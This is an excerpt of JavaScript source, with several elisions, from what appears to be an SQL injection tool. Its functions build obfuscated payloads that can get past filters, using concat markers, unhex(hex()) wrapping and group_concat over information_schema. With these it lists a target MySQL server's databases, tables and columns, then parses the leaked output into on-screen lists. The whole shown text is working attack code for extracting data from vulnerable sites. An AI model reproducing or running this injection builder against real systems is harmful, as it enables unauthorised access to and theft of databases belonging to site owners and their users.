...
function AddDB(dbs)
{
	...
	/*var dbsArray = dbs.split(SQL['start']);
	if(typeof dbsArray[1] == "undefined"){
		ActiveDBs(1);
	}else{
		dbsArray = dbsArray[1].split(SQL['stop'])[0].split(',');
		for (i=0; i<dbsArray.length; i++){
			$("#dblist #body").append("<div class='dbname active' id='db"+i+"'>"+dbsArray[i]+"</div>");
		}
		if(dbsArray.length < VTM['limit']){
			ActiveDBs(1);
		}else{
			DATA['count'] += VTM['limit'];
			MySQLGetDBs(DATA['count']);
		}
	}*/
}
function MySQLGetDBs(count)
{
	...
	SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['schema_name']+SQL['space']+SQL[VTM['bypass']]['as']+SQL['space']+"C"+SQL['space']+SQL[VTM['bypass']]['from']+SQL['space']+SQL[VTM['bypass']]['information_schema']+"."+SQL[VTM['bypass']]['schemata']+SQL['space']+SQL[VTM['bypass']]['limit']+SQL['space']+count+","+VTM['limit']+")"+SQL[VTM['bypass']]['as']+SQL['space']+"T"+
...
function AddTB(tbs){
	...
	/*tbsArray=tbs.split(SQL['start']);
	if(typeof tbsArray[1] == "undefined"){
		ActiveTBs(TMP['dbid'],1);
	}else{
		tbsArray = tbsArray[1].split(SQL['stop'])[0].split(',');
		for (i=0; i<tbsArray.length; i++){
			$("#tblist #body").append("<div class='tbname active' id='tb"+i+"'>"+tbsArray[i]+"</div>");
		}
		if(tbsArray.length < VTM['limit']){
			ActiveTBs(TMP['dbid'],1);
		}else{
			DATA['count'] += VTM['limit'];
			MySQLGetTBs(DATA['count']);
		}
	}*/
}
function MySQLGetTBs(count)
{
	var injecttbs = "("+SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['concat']+"("+t2h(SQL['start'])+",("+SQL[VTM['bypass']]['unhex(hex']+"(("+SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['group_concat']+"(C)"+SQL['space']+SQL[VTM['bypass']]['from']+SQL['space']+"("+SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['table_name']+SQL['space']+SQL[VTM['bypass']]['as']+SQL['space']+"C"+SQL['space']+SQL[VTM['bypass']]['from']+SQL['space']+SQL[VTM['bypass']]['information_schema']+"."+SQL[VTM['bypass']]['tables']+SQL['space']+SQL[VTM['bypass']]['where']+SQL['space']+SQL[VTM['bypass']]['table_schema']+"="+t2h(DATA['database'])+SQL['space']+SQL[VTM['bypass']]['limit']+SQL['space']+count+","+VTM['limit']+")"+SQL[VTM['bypass']]['as']+"T"+")))),"+t2h(SQL['stop'])+"))";
...
function AddCL(cls){
	...
	/*clsArray=cls.split(SQL['start']);
	if(typeof clsArray[1] == "undefined"){
		ActiveCLs(TMP['tbid'],1);
	}else{
		clsArray = clsArray[1].split(SQL['stop'])[0].split(',');
		...
		if(clsArray.length < VTM['limit']){
			ActiveCLs(TMP['tbid'],1);
		}else{
			DATA['count'] += VTM['limit'];
			MySQLGetCLs(DATA['count']);
		}
	}*/
}
...
{
	var injectcls = "("+SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['concat']+"("+t2h(SQL['start'])+",("+SQL[VTM['bypass']]['unhex(hex']+"(("+SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['group_concat']+"(C)"+SQL['space']+SQL[VTM['bypass']]['from']+SQL['space']+"("+SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['concat']+"("+SQL[VTM['bypass']]['column_name']+",0x2e,hEx(COLUMN_TYPE))"+SQL['space']+SQL[VTM['bypass']]['as']+SQL['space']+"C"+SQL['space']+SQL[VTM['bypass']]['from']+SQL['space']+SQL[VTM['bypass']]['information_schema']+"."+SQL[VTM['bypass']]['columns']+SQL['space']+SQL['space']+SQL[VTM['bypass']]['where']+SQL['space']+SQL[VTM['bypass']]['table_name']+"="+t2h(DATA['table'])+SQL['space']+SQL[VTM['bypass']]['and']+SQL['space']+SQL[VTM['bypass']]['table_schema']+"="+t2h(DATA['database'])+SQL['space']+SQL['space']+SQL[VTM['bypass']]['limit']+SQL['space']+count+","+VTM['limit']+")"+SQL[VTM['bypass']]['as']+"T"+")))),"+t2h(SQL['stop'])+"))";
...
function AddRW(data)
{
	var rw = data.split(SQL['start'])[1].split(SQL['stop'])[0].split(SQL['mid']);
